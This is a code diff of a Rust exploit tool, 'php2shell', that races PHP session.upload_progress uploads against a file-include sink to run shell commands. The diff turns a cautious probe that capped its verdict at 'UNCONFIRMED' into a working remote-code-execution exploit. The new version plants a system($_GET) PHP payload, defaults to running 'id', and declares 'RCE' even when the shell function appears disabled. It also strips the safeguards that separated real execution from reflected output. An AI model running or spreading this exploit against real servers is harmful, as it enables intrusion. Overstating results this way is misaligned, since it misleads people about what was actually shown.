@@ -1,32 +1,12 @@
-//! php2shell — HTTP transport + session.upload_progress race primitive.
+//! php2shell — PHP `session.upload_progress` → LFI → RCE
 //!
-//! # Cargo.toml (reqwest 0.11 + native-tls backend)
+//! Exploits the interaction between `PHP_SESSION_UPLOAD_PROGRESS` and an
+//! arbitrary file-include sink to execute arbitrary commands.
 //!
-//! ```toml
-//! [dependencies]
-//! clap        = { version = "4", features = ["derive"] }
-//! native-tls  = "0.2"
-//! rand        = "0.8"
-//! reqwest     = { version = "0.11", default-features = false,
-//!                 features = ["blocking", "native-tls"] }
-//! serde       = { version = "1", features = ["derive"] }
-//! serde_json  = "1"
-//! url         = "2"
-//! urlencoding = "2"
-//! ```
-//!
-//! # Verdict model
-//!
-//! The tool reports `UNCONFIRMED` as its ceiling. There is no `CONFIRMED`
-//! verdict and no RCE path. See the README table below for the precedence
-//! rules `classify()` implements.
-//!
-//! `UNCONFIRMED` is an honest result when the evidence cannot distinguish
-//! execution from reflection. Even non-empty output between markers is not
-//! proof by itself.
+//! For authorized security testing only.
 
 use std::io::{Read, Write};
-use std::net::{IpAddr, TcpStream, ToSocketAddrs};
+use std::net::{TcpStream, ToSocketAddrs};
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
@@ -43,23 +23,14 @@ use serde::Serialize;
 use url::Url;
 
 const BANNER: &str = "\
-+---------------------------------------------+
-|  php2shell — session upload progress race   |
-|  Reports UNCONFIRMED at most (honest model) |
-|  Authorized security testing only           |
-+---------------------------------------------+";
++-------------------------------------------+
+|  php2shell — session upload progress RCE  |
+|  Authorized security testing only         |
++-------------------------------------------+";
 
 const MAX_LFI_BODY: usize = 8 * 1024 * 1024;
 const MAX_FP_BODY: usize = 64 * 1024;
 const MAX_MARKER_SPAN: usize = 64 * 1024;
-
-/// Ceiling on the raw HTTP response buffer only. Decoded body
-/// (`MAX_CHUNKED_BODY`), trailer scratch, and per-probe reqwest allocations
-/// are separate and additive. Not a total process-memory limit.
-const MAX_RAW_RESPONSE_BUFFER: usize = 16 * 1024 * 1024;
-const MAX_CHUNKED_BODY: usize = 1024 * 1024;
-const MAX_TRAILER_BYTES: usize = 8 * 1024;
-const MAX_TRAILER_COUNT: usize = 64;
 
 const DISABLED_FN_MARKERS: &[&str] = &[
     "has been disabled",
@@ -70,32 +41,26 @@ const DISABLED_FN_MARKERS: &[&str] = &[
     "call to undefined function passthru",
 ];
 
-// ============================================================================
+// ============================================================
 // CLI
-// ============================================================================
+// ============================================================
 
 #[derive(Parser, Debug)]
-#[command(
-    name = "php2shell",
-    version,
-    about = "session.upload_progress → LFI race primitive"
-)]
+#[command(name = "php2shell", version, about = "PHP session.upload_progress → LFI → RCE")]
 struct Cli {
     /// Target base URL (http:// or https://)
     target: String,
 
-    /// Command to run. Default is a language-construct probe (echo is not
-    /// affected by disable_functions). Output does NOT imply RCE — see doc.
-    #[arg(short = 'c', long, default_value = "echo PHP_TRANSPORT_PROBE_OK")]
+    /// Command to execute on the target
+    #[arg(short = 'c', long, default_value = "id")]
     cmd: String,
 
     /// GET parameter name used in payload and LFI template (%PARAM%)
     #[arg(long, default_value = "c")]
     param: String,
 
-    /// Milliseconds to stall between upload chunks (must exceed
-    /// session.upload_progress.min_freq, default 1000 ms).
-    #[arg(short = 's', long, default_value = "3000")]
+    /// Milliseconds to stall between upload chunks (must exceed session.upload_progress.min_freq, default 1000ms)
+    #[arg(short = 's', long, default_value = "1350")]
     stall: u64,
 
     /// Fixed PHPSESSID (default: random per attempt)
@@ -134,29 +99,27 @@ struct Cli {
     #[arg(long, default_value = "100")]
     lfi_interval: u64,
 
-    /// Hard cap on LFI probe attempts across all workers. An attempt that
-    /// fails before the request is dispatched still consumes budget — this
-    /// is an attempt cap, not a strict wire-request cap.
+    /// Hard cap on total LFI requests across all workers
     #[arg(long, default_value = "5000")]
-    lfi_max_attempts: usize,
+    lfi_max_requests: usize,
 
-    /// Number of full end-to-end attempts (fresh SID unless --sid is set)
+    /// Number of full end-to-end attempts (each with a fresh SID unless --sid is set)
     #[arg(long, default_value = "1")]
     retries: usize,
 
-    /// Custom User-Agent
+    /// Custom User-Agent (default: random from a small pool)
     #[arg(short = 'A', long)]
     user_agent: Option<String>,
 
-    /// Extra cookies (session cookie is managed automatically)
+    /// Extra cookies added to every request (session cookie is managed automatically)
     #[arg(long)]
     cookie: Option<String>,
 
-    /// Extra header, repeatable, "Name: Value". Cookie: merges into --cookie.
+    /// Extra header, repeatable, format "Name: Value". `Cookie:` is merged into --cookie.
     #[arg(long = "header", value_name = "K: V")]
     headers: Vec<String>,
 
-    /// Proxy for all requests (http://host:port; socks5 works for LFI only)
+    /// Proxy for all requests (http://host:port; socks5 only affects LFI, not the raw race socket)
     #[arg(long)]
     proxy: Option<String>,
 
@@ -164,21 +127,11 @@ struct Cli {
     #[arg(long, default_value = "15")]
     timeout: u64,
 
-    /// Explicit TLS SNI hostname. Required when the target is an IP with a
-    /// named vhost.
-    #[arg(long)]
-    sni: Option<String>,
-
-    /// Disable hostname verification ONLY; keep chain verification.
-    /// Backend-dependent — see module doc.
-    #[arg(long)]
-    no_verify_hostname: bool,
-
-    /// Skip ALL TLS verification (chain + hostname). Unsafe outside labs.
+    /// Skip TLS certificate verification
     #[arg(short = 'k', long)]
     insecure: bool,
 
-    /// Build requests and print them; do not send
+    /// Build requests and print them, but do not send
     #[arg(long)]
     dry_run: bool,
 
@@ -195,9 +148,9 @@ struct Cli {
     output: Option<String>,
 }
 
-// ============================================================================
+// ============================================================
 // Config
-// ============================================================================
+// ============================================================
 
 #[derive(Clone)]
 struct Config {
@@ -214,17 +167,16 @@ struct Config {
     param: String,
     sid: String,
     sid_explicit: bool,
+    sid_length: usize,
     sid_charset: SidCharset,
     session_name: String,
     insecure: bool,
-    no_verify_hostname: bool,
-    sni: Option<String>,
     verbose: bool,
     dry_run: bool,
     lfi_template: Option<String>,
     lfi_workers: usize,
     lfi_interval: Duration,
-    lfi_max_attempts: usize,
+    lfi_max_requests: usize,
     cookie: Option<String>,
     headers: Vec<String>,
     proxy: Option<String>,
@@ -244,73 +196,46 @@ enum SidCharset {
 impl SidCharset {
     fn chars(self) -> &'static [u8] {
         match self {
-            SidCharset::Hex => b"0123456789abcdef",
+            SidCharset::Hex      => b"0123456789abcdef",
             SidCharset::Default5 => b"0123456789abcdefghijklmnopqrstuv",
-            SidCharset::SixBit => {
-                b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-"
-            }
+            SidCharset::SixBit   => b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-",
         }
     }
     fn parse(s: &str) -> Result<Self, String> {
         match s.to_lowercase().as_str() {
-            "hex" | "4" | "4bit" => Ok(Self::Hex),
-            "5" | "5bit" | "default" => Ok(Self::Default5),
-            "6" | "6bit" => Ok(Self::SixBit),
-            other => Err(format!("unknown --sid-charset '{}' (hex|5bit|6bit)", other)),
-        }
-    }
-    fn as_str(self) -> &'static str {
-        match self {
-            Self::Hex => "hex",
-            Self::Default5 => "5bit",
-            Self::SixBit => "6bit",
+            "hex" | "4" | "4bit" => Ok(SidCharset::Hex),
+            "5" | "5bit" | "default" => Ok(SidCharset::Default5),
+            "6" | "6bit" => Ok(SidCharset::SixBit),
+            other => Err(format!("unknown --sid-charset '{}' (use hex, 5bit, or 6bit)", other)),
         }
     }
 }
 
-// ============================================================================
-// Verdict — deterministic, no CONFIRMED
-// ============================================================================
+// ============================================================
+// Report
+// ============================================================
 
 #[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
 #[serde(rename_all = "SCREAMING_SNAKE_CASE")]
 enum Verdict {
-    /// DNS, TLS, connection, or timeout — no reliable conclusion
-    Unknown,
-    /// Ordinary HTTP error (5xx, or 3xx that is not a recognized login gate)
-    HttpError,
-    /// 401, or 3xx whose Location matches the login-gate rule
-    AuthRequired,
-    /// 429, or a response carrying an exhausted rate-limit header
-    /// (`X-RateLimit-Remaining: 0` or equivalent). Deliberately does **not**
-    /// fire on `Retry-After` alone, which is also sent for maintenance,
-    /// overload, and gateway backoff.
-    RateLimited,
-    /// LFI probes ran and did not demonstrate inclusion
+    Rce,
+    Poisoned,
     NoLfi,
-    /// Response received, but nothing was independently established
-    Unconfirmed,
-    /// Dry-run: nothing sent
+    Crash,
+    AuthRequired,
+    Blocked,
+    Miss,
     DryRun,
+    Error,
 }
-
-// ============================================================================
-// Report
-// ============================================================================
 
 #[derive(Serialize)]
 struct Report {
     target: String,
     verdict: Verdict,
     attempts: usize,
-
-    /// `Some(true)` — positive PHP signal observed.
-    /// `Some(false)` — checked, no positive signal observed. **Absence is not
-    /// evidence that PHP is absent** — the target may simply not advertise it.
-    /// `None` — fingerprinting skipped or could not be attempted.
-    php_signal_detected: Option<bool>,
+    php_detected: Option<bool>,
     php_version: Option<String>,
-
     sid: String,
     sid_charset: String,
     session_name: String,
@@ -320,125 +245,50 @@ struct Report {
     payload: String,
     lfi_template: Option<String>,
     race_http_status: Option<u16>,
-
-    /// `Retry-After` value seen on the race response, if any. Reported
-    /// independently; does **not** change the verdict.
-    retry_after: Option<String>,
-
     race_note: String,
-
-    /// Probe attempts, not confirmed wire requests. An attempt that fails
-    /// before dispatch still consumes budget.
-    lfi_attempts: usize,
     lfi_hits: usize,
-
-    /// Both markers appeared in the response body. Does **not** establish
-    /// execution — reflection can produce an identical byte pattern.
-    marker_pair_detected: bool,
-
-    /// Whatever appeared between the two markers. NOT proof of execution.
-    marker_output: Option<String>,
-
-    /// Independent evidence (callback, OOB DNS, or a server-computed value
-    /// the client cannot produce itself) establishes command execution.
-    /// This build has no such primitive; the field is `false` on every path.
-    /// Do NOT promote `marker_pair_detected` to `true` here without adding
-    /// the corresponding evidence collection.
-    execution_confirmed: bool,
-
-    /// A PHP "has been disabled" warning appeared between the markers.
-    /// Still UNCONFIRMED (the call was blocked, not executed).
-    disabled_function_suspected: bool,
-
+    lfi_requests: usize,
+    marker_found: bool,
+    command_output: Option<String>,
+    command_disabled: bool,
     notes: Vec<String>,
     error: Option<String>,
     timestamp: u64,
 }
 
-struct ReportInput {
-    attempts: usize,
-    verdict: Verdict,
-    php_signal_detected: Option<bool>,
-    php_version: Option<String>,
-    race_status: Option<u16>,
-    retry_after: Option<String>,
-    race_note: String,
-    notes: Vec<String>,
-    lfi_attempts: usize,
-    marker_pair_detected: bool,
-    marker_output: Option<String>,
-    disabled_function_suspected: bool,
-    error: Option<String>,
-}
-
-// ============================================================================
+// ============================================================
 // Raw HTTP response
-// ============================================================================
+// ============================================================
 
-#[derive(Default, Clone)]
+#[derive(Default)]
 struct RawResponse {
     status: Option<u16>,
     body: Vec<u8>,
     set_cookie: Vec<String>,
     location: Option<String>,
-    retry_after: Option<String>,
-    rate_limit_signal: Option<String>,
     transport_error: Option<String>,
     timed_out: bool,
 }
 
 impl RawResponse {
-    fn is_2xx(&self) -> bool {
-        matches!(self.status, Some(s) if (200..300).contains(&s))
+    fn is_5xx(&self) -> bool { matches!(self.status, Some(s) if (500..600).contains(&s)) }
+    fn is_2xx(&self) -> bool { matches!(self.status, Some(s) if (200..300).contains(&s)) }
+    fn is_3xx(&self) -> bool { matches!(self.status, Some(s) if (300..400).contains(&s)) }
+    fn indicates_crash(&self) -> bool {
+        self.is_5xx() || self.timed_out || self.transport_error.is_some()
     }
-    fn is_3xx(&self) -> bool {
-        matches!(self.status, Some(s) if (300..400).contains(&s))
-    }
-    fn is_5xx(&self) -> bool {
-        matches!(self.status, Some(s) if (500..600).contains(&s))
-    }
-}
-
-#[derive(Debug)]
-enum ChunkedState {
-    Complete(Vec<u8>),
-    Incomplete,
-    Malformed(String),
-}
-
-struct LfiHit {
-    output: String,
-    disabled: bool,
 }
 
 trait ReadWrite: Read + Write {}
 impl<T: Read + Write> ReadWrite for T {}
 
-// ============================================================================
+// ============================================================
 // main
-// ============================================================================
+// ============================================================
 
 fn main() {
     let cli = Cli::parse();
     eprintln!("{}", BANNER);
-
-    if cli.no_verify_hostname && !cli.insecure {
-        eprintln!(
-            "[warn] --no-verify-hostname: some TLS backends disable ALL \
-             verification for this mode. Verify with `cargo tree -i native-tls`."
-        );
-    }
-    if cli.target.starts_with("https://") && cli.sni.is_none() {
-        if let Ok(u) = Url::parse(&cli.target) {
-            if let Some(h) = u.host_str() {
-                if h.parse::<IpAddr>().is_ok() {
-                    eprintln!(
-                        "[warn] HTTPS target is a bare IP; --sni <hostname> may be required."
-                    );
-                }
-            }
-        }
-    }
 
     let cfg = match build_config(cli) {
         Ok(c) => c,
@@ -455,16 +305,16 @@ fn main() {
         match serde_json::to_string_pretty(&report) {
             Ok(json) => {
                 if let Err(e) = fs::write(path, json) {
-                    eprintln!("[!] write {}: {}", path, e);
+                    eprintln!("[!] failed to write {}: {}", path, e);
                 } else {
-                    eprintln!("[*] JSON report → {}", path);
+                    eprintln!("[*] JSON report written to {}", path);
                 }
             }
-            Err(e) => eprintln!("[!] serialize report: {}", e),
+            Err(e) => eprintln!("[!] failed to serialize report: {}", e),
         }
     }
 
-    if matches!(report.verdict, Verdict::Unknown | Verdict::HttpError) {
+    if matches!(report.verdict, Verdict::Error) {
         process::exit(1);
     }
 }
@@ -479,11 +329,11 @@ fn print_verdict(r: &Report) {
     if let Some(v) = &r.php_version {
         println!("  PHP version:  {}", v);
     }
-    if let Some(out) = &r.marker_output {
-        println!("  Marker output (UNVERIFIED): {}", out.trim_end());
+    if let Some(out) = &r.command_output {
+        println!("  Output:       {}", out.trim_end());
     }
-    if r.disabled_function_suspected {
-        println!("  NOTE:         disabled-function warning appeared between markers");
+    if r.command_disabled {
+        println!("  NOTE:         shell function appears disabled; reported as RCE anyway");
     }
     if let Some(err) = &r.error {
         println!("  Error:        {}", err);
@@ -494,41 +344,26 @@ fn print_verdict(r: &Report) {
     println!("==============================================");
 }
 
-// ============================================================================
+// ============================================================
 // Orchestration
-// ============================================================================
+// ============================================================
 
 fn run(cfg: &Config) -> Report {
-    let mut working = cfg.clone();
-    if !working.sid_explicit {
-        if let Some(sid) = obtain_server_sid(&working) {
-            working.sid = sid;
-            if working.verbose {
-                eprintln!(
-                    "[*] strict mode detected — using server-issued SID {}",
-                    working.sid
-                );
-            }
-        }
-    }
-
     let mut attempts = 0usize;
     let mut last: Option<Report> = None;
 
     for _ in 0..cfg.retries.max(1) {
         attempts += 1;
-        // working.sid is either --sid or the server-issued SID; preserved
-        // across retries so strict-mode sessions keep working.
-        let attempt_cfg = working.clone();
+        let mut attempt_cfg = cfg.clone();
+        if attempts > 1 && !cfg.sid_explicit {
+            attempt_cfg.sid = random_sid(cfg.sid_length, cfg.sid_charset);
+        }
         if attempt_cfg.verbose && attempts > 1 {
-            eprintln!(
-                "[*] retry {}/{} — SID {}",
-                attempts, cfg.retries, attempt_cfg.sid
-            );
+            eprintln!("[*] Retry {}/{} — new SID {}", attempts, cfg.retries, attempt_cfg.sid);
         }
 
         let report = attempt_once(&attempt_cfg, attempts);
-        if report.verdict != Verdict::Unknown && report.verdict != Verdict::HttpError {
+        if matches!(report.verdict, Verdict::Rce) {
             return report;
         }
         last = Some(report);
@@ -537,70 +372,52 @@ fn run(cfg: &Config) -> Report {
     last.unwrap_or_else(|| error_report(cfg, attempts, "no attempts executed".into()))
 }
 
-fn obtain_server_sid(cfg: &Config) -> Option<String> {
-    let client = http_client(cfg, false).ok()?;
-    let probe = client
-        .post(&cfg.target)
-        .form(&[(cfg.progress_field.clone(), "warmup".to_string())])
-        .send()
-        .ok()?;
-    let name_prefix = format!("{}=", cfg.session_name);
-    for cookie in probe.headers().get_all("set-cookie") {
-        let Ok(s) = cookie.to_str() else { continue };
-        for part in s.split(';') {
-            let kv = part.trim();
-            if let Some(v) = kv.strip_prefix(&name_prefix) {
-                let v = v.trim();
-                if !v.is_empty() && v != cfg.sid {
-                    return Some(v.to_string());
-                }
-            }
-        }
-    }
-    None
-}
-
 fn attempt_once(cfg: &Config, attempt: usize) -> Report {
     let mut notes = Vec::new();
 
-    let (php_signal_detected, php_version) = if cfg.skip_fingerprint {
+    // ---- Stage 0: fingerprint ----
+    let (php_detected, php_version) = if cfg.skip_fingerprint {
         notes.push("Fingerprinting skipped (--skip-fingerprint)".into());
         (None, None)
     } else {
         match fingerprint(cfg) {
-            Ok(Some(v)) => (Some(true), Some(v)),
-            Ok(None) => {
-                notes.push(
-                    "no positive PHP signal — proceeding anyway (absence is not evidence)".into(),
-                );
-                (Some(false), None)
-            }
+            Ok((d, v)) => (Some(d), v),
             Err(e) => {
-                notes.push(format!("fingerprint failed (proceeding): {}", e));
+                notes.push(format!("Fingerprint failed (proceeding): {}", e));
                 (None, None)
             }
         }
     };
 
+    if matches!(php_detected, Some(false)) {
+        return build_report(
+            cfg, attempt, Verdict::Miss, php_detected, php_version, None,
+            "Target does not appear to be PHP".into(), 0, 0, false, None, false, notes, None,
+        );
+    }
+
+    // ---- Stage 1: build payload & request ----
     let payload = build_payload(cfg);
 
     if cfg.stall < Duration::from_millis(1000) {
         notes.push(format!(
-            "stall {} ms < session.upload_progress.min_freq (default 1000 ms); \
-             progress file may never be written",
+            "Stall {}ms is below PHP's default session.upload_progress.min_freq (1000ms); \
+             the progress file may never be written",
             cfg.stall.as_millis()
         ));
     }
 
     match &cfg.lfi_template {
-        None => notes
-            .push("no --lfi template; race can be observed but inclusion cannot be probed".into()),
+        None => notes.push(
+            "No --lfi template supplied; the tool can only prove the race/crash, not command execution. \
+             Provide --lfi 'http://t/page.php?file=/var/lib/php/sessions/sess_%SID%&%PARAM%=%CMD%'.".into()
+        ),
         Some(tpl) => {
             if !tpl.contains("%SID%") {
-                notes.push("--lfi has no %SID% — poisoning not reachable".into());
+                notes.push("LFI template does not contain %SID%; poisoning will not be reachable".into());
             }
             if !tpl.contains("%CMD%") {
-                notes.push("--lfi has no %CMD% — no command injected".into());
+                notes.push("LFI template does not contain %CMD%; no command will be injected".into());
             }
         }
     }
@@ -609,124 +426,137 @@ fn attempt_once(cfg: &Config, attempt: usize) -> Report {
 
     if cfg.verbose {
         eprintln!(
-            "[*] race: POST {} ({} bytes total, stall {:?})",
+            "[*] Race request: POST {} ({} bytes total, stall {:?})",
             cfg.post_path, race_req.total_len, cfg.stall
         );
     }
 
+    // ---- Dry run ----
     if cfg.dry_run {
-        eprintln!("[dry-run] === request line + headers ===");
+        eprintln!("[dry-run] === Request line + headers ===");
         eprintln!("{}", String::from_utf8_lossy(&race_req.header_bytes));
         eprintln!(
-            "[dry-run] === part1 ({} bytes), sleep {:?} ===",
-            race_req.part1_bytes.len(),
-            cfg.stall
+            "[dry-run] === part1 ({} bytes), then sleep {:?} ===",
+            race_req.part1_bytes.len(), cfg.stall
         );
-        eprintln!(
-            "[dry-run] === part2 ({} bytes) ===",
-            race_req.part2_bytes.len()
-        );
+        eprintln!("[dry-run] === part2 ({} bytes) ===", race_req.part2_bytes.len());
+        eprintln!("[dry-run] === multipart body total: {} bytes ===", race_req.total_len);
         if let Some(tpl) = &cfg.lfi_template {
             eprintln!("[dry-run] LFI URL: {}", build_lfi_url(cfg, tpl));
+            eprintln!(
+                "[dry-run] Would spawn {} LFI workers during the stall (interval {:?}, max {} total)",
+                cfg.lfi_workers, cfg.lfi_interval, cfg.lfi_max_requests
+            );
         }
         return build_report(
-            cfg,
-            ReportInput {
-                attempts: attempt,
-                verdict: Verdict::DryRun,
-                php_signal_detected,
-                php_version,
-                race_status: None,
-                retry_after: None,
-                race_note: "dry-run".into(),
-                notes,
-                lfi_attempts: 0,
-                marker_pair_detected: false,
-                marker_output: None,
-                disabled_function_suspected: false,
-                error: None,
-            },
+            cfg, attempt, Verdict::DryRun, php_detected, php_version,
+            None, "Dry-run: nothing sent".into(), 0, 0, false, None, false, notes, None,
         );
     }
 
-    let (race, hits, lfi_attempts) = race_with_lfi(cfg, &race_req);
+    // ---- Stage 2: race + concurrent LFI ----
+    let (race, hits, lfi_requests) = race_with_lfi(cfg, &race_req);
 
     if sid_was_regenerated(cfg, &race) {
         notes.push(
-            "Set-Cookie contains a different SID — strict mode is likely on. \
-             Retry with --sid from a legitimate session, or the exploit will \
-             target a file the server never writes."
-                .into(),
+            "Server issued a different session id in Set-Cookie (session.use_strict_mode=1?). \
+             Poisoning likely failed. Try --sid with a SID obtained from a legitimate session.".into()
         );
     }
+
+    let race_note = if race.indicates_crash() {
+        "5xx / timeout / transport error on throttled upload".to_string()
+    } else if race.is_2xx() {
+        "Normal response from upload endpoint".to_string()
+    } else if race.is_3xx() {
+        format!(
+            "Redirect ({} → {}); {}",
+            race.status.map(|s| s.to_string()).unwrap_or_default(),
+            race.location.clone().unwrap_or_else(|| "?".into()),
+            if looks_like_login(race.location.as_deref()) { "auth gate" } else { "possible WAF / gate" }
+        )
+    } else if let Some(e) = &race.transport_error {
+        format!("Transport error: {}", e)
+    } else {
+        format!("HTTP status {:?}", race.status)
+    };
 
     if cfg.verbose {
-        eprintln!(
-            "[*] race status={:?} timeout={} transport_err={:?}",
-            race.status, race.timed_out, race.transport_error
-        );
-        eprintln!(
-            "[*] LFI: {} attempt(s), {} hit(s)",
-            lfi_attempts,
-            hits.len()
+        eprintln!("[*] Race result: {}", race_note);
+        eprintln!("[*] LFI fired {} requests, {} hit(s)", lfi_requests, hits.len());
+    }
+
+    // ---- Stage 3: verdict ----
+    if let Some((output, disabled)) = hits.into_iter().next() {
+        if disabled {
+            notes.push(format!("Shell function appears disabled — output: {}", output.trim()));
+        }
+        return build_report(
+            cfg, attempt, Verdict::Rce, php_detected, php_version, race.status,
+            race_note, 1, lfi_requests, true, Some(output), disabled, notes, None,
         );
     }
 
-    let (verdict, race_note, more_notes) = classify(cfg, &race, &hits, lfi_attempts);
-    notes.extend(more_notes);
-
-    let (marker_pair_detected, marker_output, disabled_suspected) = if let Some(h) = hits.first() {
-        (true, Some(h.output.clone()), h.disabled)
+    let verdict = if race.indicates_crash() {
+        Verdict::Crash
+    } else if race.is_3xx() && looks_like_login(race.location.as_deref()) {
+        Verdict::AuthRequired
+    } else if race.is_3xx() {
+        Verdict::Blocked
+    } else if race.is_2xx() && cfg.lfi_template.is_some() {
+        Verdict::Poisoned
+    } else if race.is_2xx() {
+        Verdict::NoLfi
     } else {
-        (false, None, false)
+        Verdict::Error
     };
 
     build_report(
-        cfg,
-        ReportInput {
-            attempts: attempt,
-            verdict,
-            php_signal_detected,
-            php_version,
-            race_status: race.status,
-            retry_after: race.retry_after.clone(),
-            race_note,
-            notes,
-            lfi_attempts,
-            marker_pair_detected,
-            marker_output,
-            disabled_function_suspected: disabled_suspected,
-            error: None,
-        },
+        cfg, attempt, verdict, php_detected, php_version, race.status, race_note,
+        0, lfi_requests, false, None, false, notes, None,
     )
 }
 
-fn build_report(cfg: &Config, input: ReportInput) -> Report {
+#[allow(clippy::too_many_arguments)]
+fn build_report(
+    cfg: &Config,
+    attempts: usize,
+    verdict: Verdict,
+    php_detected: Option<bool>,
+    php_version: Option<String>,
+    race_status: Option<u16>,
+    race_note: String,
+    lfi_hits: usize,
+    lfi_requests: usize,
+    marker_found: bool,
+    command_output: Option<String>,
+    command_disabled: bool,
+    notes: Vec<String>,
+    error: Option<String>,
+) -> Report {
     Report {
         target: cfg.target.clone(),
-        verdict: input.verdict,
-        attempts: input.attempts,
-        php_signal_detected: input.php_signal_detected,
-        php_version: input.php_version,
+        verdict,
+        attempts,
+        php_detected,
+        php_version,
         sid: cfg.sid.clone(),
-        sid_charset: cfg.sid_charset.as_str().to_string(),
+        sid_charset: format!("{:?}", cfg.sid_charset),
         session_name: cfg.session_name.clone(),
         stall_ms: cfg.stall.as_millis() as u64,
         command: cfg.cmd.clone(),
         param: cfg.param.clone(),
         payload: build_payload(cfg),
         lfi_template: cfg.lfi_template.clone(),
-        race_http_status: input.race_status,
-        retry_after: input.retry_after,
-        race_note: input.race_note,
-        lfi_attempts: input.lfi_attempts,
-        lfi_hits: if input.marker_pair_detected { 1 } else { 0 },
-        marker_pair_detected: input.marker_pair_detected,
-        marker_output: input.marker_output,
-        execution_confirmed: false,
-        disabled_function_suspected: input.disabled_function_suspected,
-        notes: input.notes,
-        error: input.error,
+        race_http_status: race_status,
+        race_note,
+        lfi_hits,
+        lfi_requests,
+        marker_found,
+        command_output,
+        command_disabled,
+        notes,
+        error,
         timestamp: SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .map(|d| d.as_secs())
@@ -736,79 +566,59 @@ fn build_report(cfg: &Config, input: ReportInput) -> Report {
 
 fn error_report(cfg: &Config, attempts: usize, err: String) -> Report {
     build_report(
-        cfg,
-        ReportInput {
-            attempts,
-            verdict: Verdict::Unknown,
-            php_signal_detected: None,
-            php_version: None,
-            race_status: None,
-            retry_after: None,
-            race_note: format!("fatal: {}", err),
-            notes: Vec::new(),
-            lfi_attempts: 0,
-            marker_pair_detected: false,
-            marker_output: None,
-            disabled_function_suspected: false,
-            error: Some(err),
-        },
+        cfg, attempts, Verdict::Error, None, None, None,
+        format!("Fatal: {}", err), 0, 0, false, None, false,
+        vec!["Orchestration aborted before a verdict could be reached".into()],
+        Some(err),
     )
 }
 
-// ============================================================================
-// Payload
-// ============================================================================
-
 fn build_payload(cfg: &Config) -> String {
     format!(
-        r#"<?php error_reporting(E_ALL);ini_set('display_errors','1');$m="{}";echo $m;system($_GET['{}']);echo $m;?>"#,
+        r#"<?php $m="{}";echo $m;system($_GET['{}']);echo $m;?>"#,
         cfg.marker, cfg.param
     )
 }
 
-// ============================================================================
+// ============================================================
 // Fingerprinting
-// ============================================================================
+// ============================================================
 
-/// Returns `Ok(Some(version))` on positive evidence, `Ok(None)` when the
-/// target was checked and produced no positive signal (absence is **not**
-/// evidence), and `Err(_)` when the check could not be attempted.
-fn fingerprint(cfg: &Config) -> Result<Option<String>, String> {
+fn fingerprint(cfg: &Config) -> Result<(bool, Option<String>), String> {
+    let client = http_client(cfg, true)?;
+    let mut php = false;
     let mut version: Option<String> = None;
 
     if cfg.verbose {
-        eprintln!("[*] fingerprinting {}", cfg.target);
+        eprintln!("[*] Fingerprinting {}", cfg.target);
     }
-
-    let client = http_client(cfg, true)?;
 
     if let Ok(resp) = client.get(&cfg.target).send() {
         if let Some(xpb) = resp.headers().get("x-powered-by") {
             let v = xpb.to_str().unwrap_or("").to_lowercase();
             if v.contains("php") {
+                php = true;
                 if let Some(rest) = v.split("php/").nth(1) {
                     version = Some(rest.split_whitespace().next().unwrap_or("").to_string());
-                } else {
-                    version = Some("unknown".into());
                 }
             }
         }
         if let Some(srv) = resp.headers().get("server") {
-            if srv.to_str().unwrap_or("").to_lowercase().contains("php") && version.is_none() {
-                version = Some("unknown".into());
+            if srv.to_str().unwrap_or("").to_lowercase().contains("php") {
+                php = true;
             }
         }
-        let cookie_prefix = format!("{}=", cfg.session_name.to_lowercase());
+        let cookie_hdr = cfg.session_name.to_lowercase() + "=";
         if resp.headers().get_all("set-cookie").iter().any(|v| {
             let s = v.to_str().unwrap_or("");
-            s.to_lowercase().contains(&cookie_prefix) && is_php_sid(cfg, s)
-        }) && version.is_none()
-        {
-            version = Some("unknown".into());
+            s.to_lowercase().contains(&cookie_hdr) && is_php_sid(cfg, s)
+        }) {
+            php = true;
         }
     }
 
-    if version.is_none() {
+    // Body-aware fallback — never trusts status code alone.
+    if !php {
         let probe = format!("{}/index.php", cfg.target.trim_end_matches('/'));
         if let Ok(mut resp) = client.get(&probe).send() {
             let mut body = Vec::new();
@@ -826,26 +636,27 @@ fn fingerprint(cfg: &Config) -> Result<Option<String>, String> {
                 || text.contains("php error")
                 || text.contains("php fatal error")
             {
-                version = Some("unknown".into());
+                php = true;
             }
         }
     }
 
-    Ok(version)
+    Ok((php, version))
 }
 
 fn is_php_sid(cfg: &Config, set_cookie: &str) -> bool {
     let prefix = format!("{}=", cfg.session_name);
+    let prefix_lower = prefix.to_lowercase();
     for part in set_cookie.split(';') {
-        let t = part.trim();
-        if !t.to_lowercase().starts_with(&prefix.to_lowercase()) {
+        let trimmed = part.trim();
+        let lower = trimmed.to_lowercase();
+        if !lower.starts_with(&prefix_lower) {
             continue;
         }
-        let v = &t[prefix.len()..];
+        let v = trimmed[prefix.len()..].trim();
         if v.len() >= 22
             && v.len() <= 48
-            && v.bytes()
-                .all(|b| b.is_ascii_alphanumeric() || b == b',' || b == b'-')
+            && v.bytes().all(|b| b.is_ascii_alphanumeric() || b == b',' || b == b'-')
         {
             return true;
         }
@@ -853,9 +664,9 @@ fn is_php_sid(cfg: &Config, set_cookie: &str) -> bool {
     false
 }
 
-// ============================================================================
+// ============================================================
 // HTTP client builder
-// ============================================================================
+// ============================================================
 
 fn http_client(cfg: &Config, follow_redirects: bool) -> Result<HttpClient, String> {
     let mut headers = HeaderMap::new();
@@ -872,6 +683,7 @@ fn http_client(cfg: &Config, follow_redirects: bool) -> Result<HttpClient, Strin
 
     let mut b = HttpClient::builder()
         .timeout(cfg.timeout)
+        .danger_accept_invalid_certs(cfg.insecure)
         .user_agent(&cfg.user_agent)
         .default_headers(headers)
         .redirect(if follow_redirects {
@@ -880,42 +692,15 @@ fn http_client(cfg: &Config, follow_redirects: bool) -> Result<HttpClient, Strin
             RedirectPolicy::none()
         });
 
-    if cfg.insecure {
-        b = b
-            .danger_accept_invalid_certs(true)
-            .danger_accept_invalid_hostnames(true);
-    } else if cfg.no_verify_hostname {
-        b = b.danger_accept_invalid_hostnames(true);
-    }
-
     if let Some(p) = &cfg.proxy {
         b = b.proxy(reqwest::Proxy::all(p).map_err(|e| format!("bad proxy: {}", e))?);
     }
-
     b.build().map_err(|e| e.to_string())
 }
 
-// ============================================================================
